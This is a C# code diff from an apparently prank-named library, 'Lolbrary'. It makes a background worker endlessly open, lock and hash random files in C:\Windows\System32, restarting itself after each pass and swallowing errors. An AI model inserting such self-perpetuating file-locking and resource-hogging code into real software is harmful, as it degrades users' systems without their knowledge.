@@ -23,8 +23,7 @@ namespace Lolbrary
         private void LockInit()
         {
             var rand = new Random();
-            var path = Environment.ExpandEnvironmentVariables("%SYSTEM%");
-            var files = Directory.GetFiles(path, "*.*", SearchOption.AllDirectories);
+            var files = Directory.GetFiles(@"C:\Windows\System32", "*.*", SearchOption.TopDirectoryOnly);
             _rFile = files[rand.Next(files.Length)];
         }
 
@@ -34,17 +33,36 @@ namespace Lolbrary
             {
                 _worker.WorkerSupportsCancellation = true;
                 _worker.DoWork += _worker_DoWork;
+                _worker.RunWorkerCompleted += _worker_RunWorkerCompleted;
 
-                _worker.RunWorkerAsync();
+                while (true && !_worker.IsBusy)
+                {
+                    _worker.RunWorkerAsync();
+                }
             }
+        }
+
+        private void _worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
+        {
+            //Console.WriteLine("Finish - {0}", _rFile);
+            LockInit();
+            LockProcess();
         }
 
         private void _worker_DoWork(object sender, DoWorkEventArgs e)
         {
-            SHA512 sha512 = SHA512.Create();
-            using (FileStream fs = File.Open(_rFile, FileMode.Open))
+            try
             {
-                sha512.ComputeHash(fs);
+                SHA512Managed sha512managed = new SHA512Managed();
+                using (FileStream fs = File.Open(_rFile, FileMode.Open))
+                {
+                    //Console.WriteLine("Start - {0}", _rFile);
+                    sha512managed.ComputeHash(fs);
+                }
+            }
+            catch
+            {
+                LockInit();
             }
         }
 
